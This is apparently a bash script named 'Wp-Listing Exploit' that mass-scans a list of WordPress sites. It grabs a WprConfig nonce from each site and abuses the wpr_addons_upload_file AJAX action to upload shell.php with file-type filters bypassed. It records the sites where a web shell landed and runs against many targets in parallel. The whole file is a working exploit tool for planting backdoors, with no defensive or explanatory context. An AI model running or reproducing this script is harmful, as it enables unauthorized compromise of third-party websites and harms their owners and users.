#!/bin/bash
# Usage: bash exploit.sh list.txt thread 
yellow='\033[0;33m'
cat << "EOF"
  _      _____    __   _     __  _           ___         
 | | /| / / _ \  / /  (_)__ / /_(_)__  ___ _/ _ \_______ 
 | |/ |/ / ___/ / /__/ (_-</ __/ / _ \/ _ `/ ___/ __/ _ \
 |__/|__/_/    /____/_/___/\__/_/_//_/\_, /_/  /_/  \___/
                                     /___/               
EOF
printf "     Wp-Listing Exploit\n\n"
printf "${yellow}Usage: bash exploit.sh\n\n"

exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

nonceValue=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target" | grep -o 'var WprConfig.*' | sed 's/.*"nonce":"\([^"]*\)".*/\1/')

if [[ $(curl --silent --insecure -X POST -F "uploaded_file=@shell.php$" -F "wpr_addons_nonce=$nonceValue" -F "triggering_event=click" -F "max_file_size=125125125" -F "allowed_file_types=p$hp,php,php$" $target/wp-admin/admin-ajax.php?action=wpr_addons_upload_file) =~ 'success":true' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target/wp-content/uploads/wpr-addons/forms/shell.php] \n";
    echo "$target/wp-content/uploads/wpr-addons/forms/shell.php" >> vulnerable.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvulnerable.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vulnerable.txt | wc -l)
totalb=$(cat notvulnerable.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Bad : $totalb\n";
